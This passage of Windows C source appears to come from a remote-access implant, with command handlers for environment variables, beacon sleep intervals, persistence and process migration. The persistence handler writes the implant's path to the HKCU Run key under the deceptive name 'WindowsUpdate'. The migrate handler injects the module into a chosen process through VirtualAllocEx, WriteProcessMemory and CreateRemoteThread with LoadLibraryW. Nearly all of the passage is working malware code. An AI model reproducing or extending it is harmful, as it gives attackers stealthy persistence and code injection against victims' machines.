	*responseLen = 0;

	status = ConvertUtf8ToWideString(dataLen, data, &varName);
	if (status != NO_ERROR)
	{
		return status;
	}

	valueLen = GetEnvironmentVariableW(varName, valueBuf, ARRAYSIZE(valueBuf));
	ImplantHeapFree(varName);

	if (valueLen == 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	valueBytes = (valueLen + 1) * sizeof(WCHAR);
	finalLen = sizeof(DWORD) + valueBytes;

	finalBuf = (PBYTE)ImplantHeapAlloc(finalLen);
	if (finalBuf == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)finalBuf = valueBytes;
	CopyMemory(finalBuf + sizeof(DWORD), valueBuf, valueBytes);

	*responseData = finalBuf;
	*responseLen = finalLen;
	return NO_ERROR;
}

// [NameLen:DWORD][NameUTF8][ValueLen:DWORD][ValueUTF8] -> [Status:DWORD]
DWORD CmdSetEnv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD nameLen = 0;
	DWORD valueLen = 0;
	PWSTR varName = NULL;
	PWSTR varValue = NULL;
	PBYTE finalBuf = NULL;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (data == NULL || dataLen < sizeof(DWORD) * 2)
	{
		return ERROR_INVALID_REQUEST;
	}

	nameLen = *(DWORD*)data;
	if (dataLen < sizeof(DWORD) + nameLen + sizeof(DWORD))
	{
		return ERROR_INVALID_REQUEST;
	}

	valueLen = *(DWORD*)(data + sizeof(DWORD) + nameLen);

	status = ConvertUtf8ToWideString(nameLen, data + sizeof(DWORD), &varName);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = ConvertUtf8ToWideString(valueLen, data + sizeof(DWORD) + nameLen + sizeof(DWORD), &varValue);
	if (status != NO_ERROR)
	{
		ImplantHeapFree(varName);
		return status;
	}

	status = SetEnvironmentVariableW(varName, varValue) ? NO_ERROR : ERROR_INVALID_REQUEST;

	ImplantHeapFree(varName);
	ImplantHeapFree(varValue);

	finalBuf = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (finalBuf != NULL)
	{
		*(DWORD*)finalBuf = status;
		*responseData = finalBuf;
		*responseLen = sizeof(DWORD);
	}

	return NO_ERROR;
}

//############################################### IMPLANT MANAGEMENT ###############################################


DWORD CmdSleep(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	PBYTE finalBuf = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	DWORD intervalMs = *(DWORD*)data;
	SetPollInterval(intervalMs);

	finalBuf = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (finalBuf != NULL)
	{
		*(DWORD*)finalBuf = intervalMs;
		*responseData = finalBuf;
		*responseLen = sizeof(DWORD);
	}

	return NO_ERROR;
}

// writes current exe path to HKCU\...\Run as "WindowsUpdate"
DWORD CmdPersist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	HKEY hKey = NULL;
	WCHAR exePath[MAX_PATH];
	DWORD exeLen = 0;
	PBYTE finalBuf = NULL;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	exeLen = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (exeLen == 0 || exeLen >= MAX_PATH)
	{
		return ERROR_INVALID_REQUEST;
	}

	if (RegOpenKeyExW(HKEY_CURRENT_USER,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
	{
		return ERROR_INVALID_REQUEST;
	}

	if (RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ,
		(BYTE*)exePath, (exeLen + 1) * sizeof(WCHAR)) != ERROR_SUCCESS)
	{
		status = ERROR_INVALID_REQUEST;
	}

	RegCloseKey(hKey);

	finalBuf = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (finalBuf != NULL)
	{
		*(DWORD*)finalBuf = status;
		*responseData = finalBuf;
		*responseLen = sizeof(DWORD);
	}

	return NO_ERROR;
}

// removes HKCU Run key entry 
DWORD CmdUnpersist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	HKEY hKey = NULL;
	PBYTE finalBuf = NULL;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (RegOpenKeyExW(HKEY_CURRENT_USER,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
	{
		return ERROR_INVALID_REQUEST;
	}

	if (RegDeleteValueW(hKey, L"WindowsUpdate") != ERROR_SUCCESS)
	{
		status = ERROR_INVALID_REQUEST;
	}

	RegCloseKey(hKey);

	finalBuf = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (finalBuf != NULL)
	{
		*(DWORD*)finalBuf = status;
		*responseData = finalBuf;
		*responseLen = sizeof(DWORD);
	}

	return NO_ERROR;
}

// injects current dll into target via CreateRemoteThread + LoadLibraryW
DWORD CmdMigrate(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD targetPid = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	WCHAR dllPath[MAX_PATH];
	DWORD dllLen = 0;
	SIZE_T dllBytes = 0;
	PVOID remoteMem = NULL;
	HMODULE hKernel32 = NULL;
	FARPROC pLoadLibrary = NULL;
	PBYTE finalBuf = NULL;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	targetPid = *(DWORD*)data;

	dllLen = GetModuleFileNameW(NULL, dllPath, MAX_PATH);
	if (dllLen == 0 || dllLen >= MAX_PATH)
	{
		return ERROR_INVALID_REQUEST;
	}

	dllBytes = (dllLen + 1) * sizeof(WCHAR);

	hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
		FALSE, targetPid);
	if (hProcess == NULL)
	{
		status = ERROR_OPEN_PROCESS_FAILED;
		goto migrate_cleanup;
	}

	remoteMem = VirtualAllocEx(hProcess, NULL, dllBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteMem == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto migrate_cleanup;
	}

	if (!WriteProcessMemory(hProcess, remoteMem, dllPath, dllBytes, NULL))
	{
		status = ERROR_EXEC_FAILED;
		goto migrate_cleanup;
	}

	hKernel32 = GetModuleHandleW(L"kernel32.dll");
	pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
	if (pLoadLibrary == NULL)
	{
		status = ERROR_INVALID_REQUEST;
		goto migrate_cleanup;
	}

	hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)pLoadLibrary, remoteMem, 0, NULL);
	if (hThread == NULL)
	{
		status = ERROR_EXEC_FAILED;
		goto migrate_cleanup;
	}

	WaitForSingleObject(hThread, 10000);

migrate_cleanup:
	if (hThread != NULL)  CloseHandle(hThread);
	if (hProcess != NULL) CloseHandle(hProcess);

	finalBuf = (PBYTE)ImplantHeapAlloc(sizeof(DWORD) + sizeof(DWORD));
	if (finalBuf != NULL)
	{
		*(DWORD*)finalBuf = status;
		*(DWORD*)(finalBuf + sizeof(DWORD)) = targetPid;
		*responseData = finalBuf;
		*responseLen = sizeof(DWORD) + sizeof(DWORD);
	}

	return NO_ERROR;
}
